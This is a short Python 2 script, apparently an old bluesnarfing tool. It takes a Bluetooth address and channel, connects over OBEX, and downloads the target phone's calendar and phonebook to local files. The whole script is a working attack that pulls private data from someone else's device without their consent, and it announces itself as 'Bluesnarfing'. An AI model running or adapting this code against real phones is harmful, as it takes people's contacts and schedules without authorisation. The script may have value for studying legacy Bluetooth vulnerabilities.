#!/usr/bin/python

import sys
from os.path import basename
from lightblue.obex import OBEXClient


if len(sys.argv) < 3:
    print sys.argv[0] + ": <btaddr> <channel>"
    sys.exit(0)

btaddr = sys.argv[1]
channel = int(sys.argv[2])

print "Bluesnarfing %s on channel %d" % (btaddr, channel)

obex = OBEXClient(btaddr, channel)
obex.connect()

fh = file("calendar.vcs", "w+")
obex.get({"name": "telecom/cal.vcs"}, fh)
fh.close()

fh = file("phonebook.vcf", "w+")
obex.get({"name": "telecom/pb.vcf"}, fh)
fh.close()

obex.disconnect()
